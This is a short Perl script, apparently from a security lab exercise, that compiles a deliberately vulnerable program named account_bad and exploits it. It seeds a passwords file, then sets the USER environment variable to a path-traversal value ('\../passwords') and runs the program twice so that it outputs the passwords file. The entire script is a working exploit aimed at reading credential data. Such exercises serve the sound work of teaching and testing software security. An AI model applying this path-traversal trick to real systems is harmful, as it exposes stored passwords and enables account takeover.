#!/usr/bin/perl

#Issue 1: Exploit a
#Aim is to get cat passwords file.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#To have some content in passwords file.
for($i=0; $i<5; $i++){
	$ENV{USER} = $i;
	system("/vulnerable/account_bad example");
}

#Changing environment variable USER. This user must not be existing one.
$ENV{USER} = '\../passwords';

#create hacker account with password hackerPassword
system("/vulnerable/account_bad hackerPassword");

#This will output content of passwords file.
system("/vulnerable/account_bad hackerPassword");